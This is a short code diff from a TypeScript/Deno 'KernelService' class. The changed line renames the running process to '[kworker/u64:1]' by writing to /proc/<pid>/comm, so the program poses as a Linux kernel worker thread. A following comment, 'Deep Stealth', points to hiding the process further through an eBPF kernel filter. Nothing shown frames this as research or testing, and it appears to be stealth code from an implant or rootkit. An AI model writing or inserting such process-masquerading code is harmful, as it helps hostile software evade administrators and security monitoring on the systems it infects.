@@ -90,7 +90,7 @@ export class KernelService {
         try {
             const selfPid = Deno.pid;
             const targetName = "[kworker/u64:1]";
-            await this.executor.execute("bash", ["-c", `echo -n '${targetName}' > /proc/${selfPid}/comm`]);
+            await this.executor.execute("./scripts/update_comm.sh", [targetName, selfPid.toString()]);
             
             // Deep Stealth: Register with eBPF Kernel filter
             if (this.sidecarManager) {
